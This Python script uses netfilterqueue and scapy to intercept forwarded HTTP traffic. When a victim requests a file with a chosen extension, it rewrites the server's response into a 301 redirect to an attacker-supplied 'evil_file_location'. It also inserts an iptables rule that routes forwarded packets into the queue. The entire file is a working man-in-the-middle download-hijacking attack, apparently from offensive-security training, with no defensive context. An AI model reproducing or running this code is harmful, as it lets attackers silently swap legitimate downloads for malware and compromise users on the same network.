import netfilterqueue
import subprocess
import scapy.all as scapy


class Replace_file:
    def __init__(self, evil_file_location, extention):
        self.extension = extention
        self.evil_file_location = evil_file_location
        self.ack_list = []
        self.queue = netfilterqueue.NetfilterQueue()
        self.queue.bind(0, self.processed_packet)

    def processed_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet[scapy.TCP].dport == 80:
                if bytes(self.extension, encoding="utf8") in scapy_packet[scapy.Raw].load:
                    self.ack_list.append(scapy_packet[scapy.TCP].ack)
            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in self.ack_list:
                    self.ack_list.remove(scapy_packet[scapy.TCP].seq)
                    scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://"+self.evil_file_location+"\n\n"
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.TCP].chksum
                    packet.set_payload(bytes(scapy_packet))
        packet.accept()

    def run(self):
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
        self.queue.run()
